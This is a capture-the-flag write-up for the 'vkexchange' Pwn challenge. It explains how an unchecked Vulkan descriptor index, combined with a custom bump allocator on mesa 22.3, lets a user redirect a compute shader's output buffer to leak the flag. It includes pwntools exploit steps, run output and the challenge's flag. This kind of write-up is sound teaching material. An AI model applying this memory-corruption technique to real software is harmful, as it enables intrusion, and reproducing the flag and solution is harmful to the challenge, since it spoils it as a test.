# vkexchange

**Category:** Pwn | **Difficulty:** Hard | **Flag:** `UMDCTF{yeah_im_sorry_for_making_this_i_know_its_really_annoying_but_at_least_maybe_you_learned_vulkan}`

## TL;DR

A stock-exchange simulator that uses Vulkan compute shaders to handle "settlement." The service lets us pass an attacker-controlled `dstArrayElement` to `vkUpdateDescriptorSets` with validation layers disabled. On mesa 22.3 (the specific version in the Docker image), descriptor sets are allocated through the challenge's own custom `VkAllocationCallbacks` into a static 16 MB `host_arena` buffer. An out-of-bounds descriptor write at index `32778` lands — with exact 32-byte alignment — on the clearing SSBO descriptor in `settlement_book`, redirecting it to our own account buffer. One compute dispatch later, the flag is sitting in our account.

## What We're Given

- `vkexchange.c` — a menu-driven C service that wraps Vulkan compute. It manages "accounts" (HOST_VISIBLE Vulkan buffers the user can read and write), "markets" (descriptor sets with configurable slot counts), and a settlement pipeline.
- `settlement.comp` — a GLSL compute shader with two SSBOs: `oracle_words` (readonly, contains the flag) and `clearing_words` (writeonly). The shader copies `oracle_words[i]` into `clearing_words[i]`.
- `Dockerfile` — Debian bookworm slim with `mesa-vulkan-drivers` at version 22.3.6 (that specific version matters enormously, as we'll see).

The service runs on the remote as a menu with seven options: open an account, fund it, audit (hex-dump) it, list a market, open the exchange, quote a position, and settle a round.

The flag is loaded from the environment variable `FLAG` (which the Docker entrypoint fills from `flag.txt`) and copied into the oracle Vulkan buffer at startup. Our goal is to get those bytes out.

## Initial Recon

The most useful thing to do first is understand the data flow the challenge *intends* you to see:

1. `open_exchange()` (option 5) calls `arm()`, which creates three raw GPU buffers: `oracle_buf` (flag bytes), `clearing_buf` (destination scratch space), and `public_quote_buf` (public pricing data).
2. `arm()` calls `vkUpdateDescriptorSets` to wire these buffers into descriptor sets: `quote_book` and `settlement_book`.
3. The compute shader is bound to `settlement_book`. When you dispatch it, it runs `clearing_words[round] = oracle_words[round]`. The flag walks from oracle into clearing.
4. Neither `oracle_buf` nor `clearing_buf` is exposed to the user directly. The only readable thing is an account buffer via `audit_account`.

So the intended design is: the flag copies from oracle → clearing, and you never see either of them. Cute.

Now let's look at what goes wrong.

## The Vulnerability / Trick

### Out-of-bounds descriptor array write

`menu_quote_position` is the exploitable menu option. It reads a `price_index` from the user (enforced to be between `MIN_PRICE_INDEX=32768` and `MAX_PRICE_INDEX=300000`), then calls:

```c
update_storage_desc(app, app->quote_book, 0, (uint32_t)idx,
                    b->buf, off, range);
```

`update_storage_desc` eventually calls `vkUpdateDescriptorSets` with this:

```c
VkWriteDescriptorSet write = {
    ...
    .dstSet        = set,           // quote_book
    .dstBinding    = 0,
    .dstArrayElement = array_elem,  // our idx — up to 300000
    .descriptorCount = 1,
    ...
};
vkUpdateDescriptorSets(app->device, 1, &write, 0, NULL);
```

The binding in `quote_book` has `descriptorCount = 1`. Passing `dstArrayElement = 32778` against a binding with one slot is a clear Vulkan spec violation. But Vulkan validation is explicitly disabled (`enabledLayerCount = 0`), so the driver doesn't complain. It just writes.

`vkUpdateDescriptorSets` — think of it as "tell the GPU driver where a particular shader resource lives." Internally, lavapipe (mesa's software Vulkan implementation) represents each descriptor as a `struct lvp_descriptor` of 32 bytes. When we write `dstArrayElement = idx`, the driver does:

```c
desc = set->descriptors[binding->descriptor_index + idx];
// then writes 32 bytes of buffer pointer/range info at desc
```

No bounds check. `idx = 32778` walks 32778 × 32 = **1,048,896 bytes** past the first descriptor in `quote_book`.

### Why this lands where we want it to

This is where the challenge's custom allocator becomes the key detail.

The Vulkan device is created with a custom `VkAllocationCallbacks`:

```c
VK_CHECK(vkCreateDevice(app->phys, &dci, &host_callbacks, &app->device));
```

`host_callbacks` routes every `vk_alloc` call (every internal mesa allocation) into a static 16 MB buffer:

```c
static uint8_t host_arena[HOST_ARENA_SIZE];  // 16 MB, lives in BSS
static size_t  host_arena_off;               // bump pointer

static void *host_alloc(void *user, size_t size, size_t alignment, ...) {
    size_t ptr_off = align_up_size(host_arena_off, alignment);
    void *ptr = host_arena + ptr_off;
    host_arena_off = ptr_off + size;
    return ptr;
}
```

This is a simple linear (bump) allocator. No fragmentation, no randomness. Every Vulkan object mesa allocates lands in `host_arena` in exactly the order it was created. The layout after `arm()` — with one market of `outcome_slots=32768` and `memo_bytes=4` — is:

```
host_arena:
  [Vulkan device internals...]
  [quote_book descriptor set]
    header (~200 bytes)
    desc[0] = public_quote_buf (storage)
    desc[1] = inline uniform block (4 bytes of memo data)
  [market[0] descriptor set]
    header
    desc[0..32767] = 32768 storage descriptors × 32 bytes each = 1,048,576 bytes
  [settlement_book descriptor set]
    header
    desc[0] = oracle_buf  (the flag)
    desc[1] = clearing_buf
```

Probing the live process showed:
- `quote_book.descriptors[0]` at arena offset `0x000f9068`
- `settlement_book.descriptors[0]` (oracle) at `0x001f9188` — distance = `0x100120` = **32777 × 32**
- `settlement_book.descriptors[1]` (clearing) at `0x001f91a8` — distance = `0x100140` = **32778 × 32**

`idx = 32778` hits `settlement_book.descriptors[1]` (the clearing buffer) dead-on. So our OOB write replaces the clearing buffer descriptor with our own account buffer. Then when the shader runs, it writes flag bytes into our account, which we can read with `audit_account`.

### The `memo_bytes=4` alignment trick

This is the subtle part. If you create the market with `memo_bytes=0`, the inline uniform block at the end of `quote_book` doesn't exist, so the total size of `quote_book`'s allocation shifts by a few bytes. The distance from `quote_book.descriptors[0]` to `settlement_book.descriptors[1]` ends up at `0x100118` — which is **not** a multiple of 32. No integer `idx` lands cleanly on a descriptor boundary, so the overwrite hits in the middle of some descriptor and everything breaks.

With `memo_bytes=4`, the inline uniform block pads `quote_book`'s allocation to add exactly the bytes needed to push the total distance to `32778 × 32`. Perfectly aligned. Only `memo_bytes ∈ {4, 8}` give 32-byte-aligned distances for this layout. Any other value (0, 12, 20, 28...) results in a misaligned hit.

## Building the Exploit

Here's the full exploit in six steps. I'll walk through each one.

**Step 1: Open an account before arming the exchange.**

```python
io.sendline(b'1')           # open_account
io.recvuntil(b'bytes: ')
io.sendline(b'4096')        # give ourselves a nice big read-back buffer
```

Accounts must be created before `open_exchange()` — the exchange refuses new accounts after it's armed. Account 0 is our "leak buffer": after the exploit, the flag will be sitting here.

**Step 2: List a market with the magic `memo_bytes=4`.**

```python
io.sendline(b'4')           # list_market
io.recvuntil(b'outcome_slots: ')
io.sendline(b'32768')       # exactly the minimum (and maximum) required
io.recvuntil(b'memo_bytes: ')
io.sendline(b'4')           # critical: 4 bytes of inline uniform block
```

`outcome_slots=32768` is both the minimum and maximum allowed value. We need exactly this many outcome slots to produce the ~1 MB gap in `host_arena` that puts `settlement_book` at the right offset. `memo_bytes=4` is the alignment knob — without it, `idx=32778` won't land on a 32-byte boundary.

**Step 3: Arm the exchange.**

```python
io.sendline(b'5')           # open_exchange
io.recvuntil(b'exchange open', timeout=45)
```

This triggers `arm()`, which initializes the Vulkan pipeline, creates the oracle/clearing buffers, allocates all descriptor sets (all landing in `host_arena`), and binds the flag into the oracle SSBO. The 45-second timeout is real — mesa's software rasterizer takes a while to spin up.

**Step 4: The OOB descriptor overwrite.**

```python
io.sendline(b'6')                   # quote_position
io.recvuntil(b'price_index: ')
io.sendline(b'32778')               # lands on settlement_book.desc[1] (clearing)
io.recvuntil(b'account: ')
io.sendline(b'0')                   # redirect clearing → our account
io.recvuntil(b'offset: ')
io.sendline(b'0')
io.recvuntil(b'range: ')
io.sendline(b'4096')
```

When `vkUpdateDescriptorSets` runs, it writes a `struct lvp_descriptor` at `quote_book.descriptors[32778]`, which is physically `settlement_book.descriptors[1]`. That struct now contains the VkBuffer handle and range for account 0. From this point on, the shader's `clearing_words[]` is backed by our account buffer.

**Step 5: Dispatch the shader for each flag word.**

```python
for w in range(64):
    io.sendline(b'7')           # settle_market
    io.recvuntil(b'round: ')
    io.sendline(str(w).encode())
    r = io.recvuntil((b'bad round', b'settled'), timeout=10)
    if b'bad round' in r:
        break
```

Each dispatch runs one workgroup that executes `clearing_words[w] = oracle_words[w]`. Because `clearing_words` now points to our account buffer, each iteration writes four bytes of the flag into account 0. The loop exits early when the server returns "bad round" (past the end of the resolution words).

**Step 6: Read back the flag.**

```python
io.sendline(b'3')           # audit_account
io.recvuntil(b'account: ')
io.sendline(b'0')
io.recvuntil(b'offset: ')
io.sendline(b'0')
io.recvuntil(b'bytes: ')
io.sendline(b'256')
line = io.recvline(timeout=5).strip()
raw = bytes.fromhex(line.decode())
```

`audit_account` hex-dumps the account buffer. We decode from hex and search for `UMDCTF{`.

## Running It

```
$ python3 solve.py
[+] Opening connection to challs.umdctf.io on port 30305: Done
[*] raw: b'UMDCTF{yeah_im_sorry_for_making_this_i_know_its_really_annoying_but_at_least_maybe_you_learned_vulkan}\x00...'
[+] FLAG: UMDCTF{yeah_im_sorry_for_making_this_i_know_its_really_annoying_but_at_least_maybe_you_learned_vulkan}
```

One connection. One flag.

## The Mesa 26 Red Herring

This took a chunk of time to figure out, so it's worth calling out explicitly.

My Kali host has mesa 26 installed. I figured I could test locally before touching the remote. Every attempt ended in SIGSEGV. I tried sweeping idx values, disabling ASLR, running under gdb. Nothing worked — the write consistently faulted.

The reason: mesa 26 changed how descriptor sets are allocated. In the newer version, each set gets its own `mmap`-backed allocation via `pscreen->allocate_memory`. The sets don't share a contiguous arena — they're in separate anonymous mappings. So an OOB write from `quote_book` into what would have been `settlement_book` on mesa 22.3 instead walks off the end of an isolated mapping and hits an unmapped page. Instant SIGSEGV, no exploitation possible.

Mesa 22.3 (Debian bookworm's version) still uses `device->vk.alloc` for descriptor set allocation. Since the challenge wires that through `host_callbacks` to the static `host_arena`, every set ends up packed into the same contiguous BSS buffer. The OOB write is deterministic, reliable, and works every time.

The fix: rebuild the exact Docker image, test inside the container. The moment I did that, the behavior matched the analysis and `idx=32778` worked on the first try, both locally and remotely.

**Lesson: always test inside the provided Docker image.** Driver-level behavior can differ between versions in ways that completely change what's exploitable.

## Key Takeaways

- **Vulkan validation is opt-in.** Without `VK_LAYER_KHRONOS_validation` enabled, the driver silently accepts out-of-range `dstArrayElement` values in `vkUpdateDescriptorSets`. A single unvalidated user-controlled integer becomes a 32-byte arbitrary write into driver-internal memory. In a real application this would be a hard-to-trigger spec violation bug; here it's the intended exploit primitive.

- **Custom `VkAllocationCallbacks` turn the driver's heap into your heap.** When a Vulkan application routes all allocations through its own allocator (into a static arena here), the attacker gains precise control over the layout of driver objects. There's no ASLR, no heap randomization — just a deterministic bump allocator. Adjacent descriptor sets are adjacent in memory, full stop.

- **`memo_bytes=4` is the alignment dial.** The OOB write primitive only works if `idx * 32` is the exact offset from `quote_book.desc[0]` to the target descriptor. The inline uniform block size in `quote_book`'s layout is the one variable that shifts this distance by a small amount. Trying all valid values of `memo_bytes` (multiples of 4 up to 256) and checking which produce a 32-byte-aligned distance to the target is how you'd find this mechanically.

- **Version-specific driver behavior is real and matters.** The same OOB primitive that works on mesa 22.3 crashes on mesa 26 because allocation strategy changed. Always validate your exploit inside the exact environment the challenge uses.

- **If you want to learn more about Vulkan descriptor internals,** the Vulkan spec section on `vkUpdateDescriptorSets` and the lavapipe source in mesa (`src/gallium/frontends/lavapipe/lvp_descriptor_set.c`) are both readable and surprisingly approachable. Mesa's lavapipe is the reference software implementation — it's designed for clarity over performance.
